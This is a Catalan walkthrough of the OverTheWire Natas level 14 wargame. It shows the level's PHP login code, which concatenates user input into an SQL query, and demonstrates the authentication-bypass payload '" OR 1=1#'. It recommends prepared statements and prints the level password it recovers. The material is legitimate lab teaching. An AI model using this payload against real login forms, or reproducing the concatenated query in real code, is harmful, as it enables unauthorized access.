<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>  
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>  
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>  
<body>  
<h1>natas14</h1>  
<div id="content">  
<?php  
if(array_key_exists("username", $_REQUEST)) {  
    $link = mysqli_connect('localhost', 'natas14', '<censored>');  
    mysqli_select_db($link, 'natas14');  
  
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";  
    if(array_key_exists("debug", $_GET)) {  
        echo "Executing query: $query<br>";  
    }  
  
    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {  
            echo "Successful login! The password for natas15 is <censored><br>";  
    } else {  
            echo "Access denied!<br>";  
    }  
    mysqli_close($link);  
} else {  
?>  
  
<form action="index.php" method="POST">  
Username: <input name="username"><br>  
Password: <input name="password"><br>  
<input type="submit" value="Login" />  
</form>  
<?php } ?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>  
</div>  
</body>  
</html>


![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/16c90144-a72c-44dc-bdc5-61ba802fd276)
 

Hi ha un PHP i hi ha un SQL, per tant haurem de fer un sql injection. EL PHP vigila que hi hagi alguna linia de resposta de l’sql. Si quan fem arribar la query el número de rows és més gran que 0 ens dona accés i si no ens el denega. Hem d’aconseguir algo que faci una query que el sevidor ens doni una resposta i ens generi rows, ja tindrem el codi necessari:

```
`if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {  
            echo "Successful login! The password for natas15 is <censored><br>";  
    } else {  
            echo "Access denied!<br>";  
    }`
```


I amb aquesta consulta manipularem els camps request d¡username i de pasword:

``SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\".$_REQUEST["password"]."\"``

Farem un OR 1=1 perquè no tenim cap dels dos valors, i direm que ens comprovi els valors o si 1 és igual a 1. Això ho farem així:

``" OR 1=1#``

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/74ea13ad-aa76-4a16-9c51-38aa5dd7fa97)
 

La query original era:

``SELECT * FROM users WHERE username = 'nom_usuari' AND password = 'contrasenya';``

La modificada és la següent:

``SELECT * FROM users WHERE username = 'nom_usuari' AND password = 'contrasenya' OR 1=1#';``

I **l’error** és que es pot fer l’injecció sql i per corregir-se s’hauria de parsejar utilitzant sentències preparades.

Amb això ja obtenim la password: ``TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB`` 

![image](https://github.com/PolMuri/OverTheWire---Natas/assets/109922379/36b9e181-27d9-428e-a0a5-468335b514fc)

